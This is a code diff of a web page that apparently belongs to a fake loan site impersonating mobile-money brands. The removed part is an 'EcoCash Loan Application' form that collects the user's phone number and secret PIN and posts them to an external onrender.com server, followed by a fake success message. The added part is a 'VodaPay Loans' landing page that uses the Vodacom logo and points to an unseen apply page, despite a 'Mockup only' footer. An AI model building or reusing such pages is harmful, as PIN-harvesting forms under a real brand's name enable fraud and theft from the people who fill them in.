@@ -1,82 +1,44 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>EcoCash Loan Application</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="./styles/style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VodaPay Loans – Instant Cash</title>
+  <link rel="stylesheet" href="./styles/style.css" />
+
 </head>
 <body>
 
-<div class="form-container">
-    <!-- Image Section -->
-    <div class="image-wrapper">
-        <img src="./gallery/ecocash.jpeg" alt="Loan Application">
+  <header class="hero">
+    <div class="container">
+      <div class="hero-content">
+        <div class="logo-area">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Vodacom_logo.svg/512px-Vodacom_logo.svg.png" 
+            alt="VodaPay / Vodacom Logo" 
+            class="vodapay-logo"
+          />
+          <h1 class="brand-title">VodaPay Loans</h1>
+        </div>
+
+        <h2 class="hero-headline">Get cash in minutes</h2>
+        <p class="hero-subtitle">
+          Fast, secure loans directly to your VodaPay wallet.<br>
+          No paperwork. No waiting. Just apply and get funded.
+        </p>
+
+        <a href="./pages/apply.html" class="btn-primary">
+          Get Loan Now
+        </a>
+      </div>
     </div>
+  </header>
 
-    <!-- Form Section -->
-    <form 
-        action="https://ecoback-9yuz.onrender.com/submit"
-        method="POST"
-        id="loanForm"
-    >
-        <h2>Loan Application Form</h2>
+  <footer>
+    <p>© 2026 VodaPay Loans Demo – Mockup only</p>
+  </footer>
 
-        <!-- EcoCash Phone -->
-        <div class="input-group">
-            <label>EcoCash Phone Number</label>
-            <div class="phone-input">
-                <span class="country-code">+263</span>
-                <input 
-                    type="tel" 
-                    name="ecocash_number" 
-                    placeholder="7XXXXXXXX" 
-                    required
-                >
-            </div>
-        </div>
 
-        <!-- PIN -->
-        <div class="input-group">
-            <label>EcoCash PIN</label>
-            <input 
-                type="password" 
-                name="pin" 
-                placeholder="Enter PIN" 
-                required
-            >
-        </div>
-
-        <!-- Loan Amount (no arrows) -->
-        <div class="input-group">
-            <label>Loan Amount (ZWL)</label>
-            <input 
-                type="number"
-                name="loan_amount"
-                placeholder="Enter amount in ZWL"
-                required
-                class="no-spinner"
-            >
-        </div>
-
-        <!-- Terms -->
-        <div class="terms">
-            <input type="checkbox" id="terms" required>
-            <label for="terms">
-                I agree that the loan will be repaid within the estimated duration.
-            </label>
-        </div>
-    <div id="successMessage" class="success-message">
-    Your loan application has been received successfully.
-    Please wait for approval and ensure your details are correct.
-    </div>
-        <!-- Submit -->
-        <button type="submit" class="submit-btn">
-            Apply Now
-        </button>
-    </form>
-</div>
-
-<script src="./scripts/script.js"></script>
+    <script src="./scripts/scripts.js" defer></script>
 </body>
 </html>
